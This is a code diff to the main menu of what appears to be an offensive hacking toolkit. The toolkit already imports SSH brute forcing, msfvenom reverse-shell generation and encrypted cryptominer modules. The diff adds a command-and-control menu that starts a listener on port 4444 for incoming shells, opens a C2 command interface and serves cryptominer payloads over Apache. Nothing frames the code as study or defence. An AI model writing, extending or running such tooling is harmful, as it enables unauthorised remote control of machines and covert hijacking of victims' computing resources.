@@ -14,6 +14,7 @@ from modules.bruteforce import load_wordlists, bruteforce_ssh
 from modules.config_handler import configure_settings, load_config
 from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
 from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
+from modules.command_control import start_listener, c2_interface, start_apache_server
 import os
 
 def main_menu():
@@ -40,7 +41,8 @@ def main_menu():
         print("16.) Configuration Settings")
         print("17.) Generate Reverse Shell")
         print("18.) Manage Cryptominers")
-        print("19.) Exit")
+        print("19.) Command and Control Center")
+        print("20.) Exit")
 
         choice = input("Enter your choice: ")
 
@@ -134,6 +136,39 @@ def main_menu():
             else:
                 print("[ERROR] Invalid choice.")
         elif choice == "19":
+            print("\n[ Command and Control Center ]")
+            print("1.) Start Listener")
+            print("2.) Command Interface")
+            print("3.) Start Apache Server for Cryptominers")
+            print("4.) Return to Main Menu")
+
+            c2_choice = input("Enter your choice: ")
+
+            if c2_choice == "1":
+                host = input("Enter listener IP (default 0.0.0.0): ") or "0.0.0.0"
+                port = input("Enter listener port (default 4444): ") or "4444"
+                try:
+                    start_listener(host, int(port))
+                except Exception as e:
+                    print(f"[ERROR] Failed to start listener: {e}")
+
+            elif c2_choice == "2":
+                c2_interface()
+
+            elif c2_choice == "3":
+                directory = "payloads/cryptominers"
+                port = input("Enter Apache server port (default 80): ") or "80"
+                try:
+                    start_apache_server(directory, int(port))
+                except Exception as e:
+                    print(f"[ERROR] Failed to start Apache server: {e}")
+
+            elif c2_choice == "4":
+                continue
+
+            else:
+                print("[ERROR] Invalid choice.")
+        elif choice == "20":
             print("[INFO] Exiting.")
             break
         else:
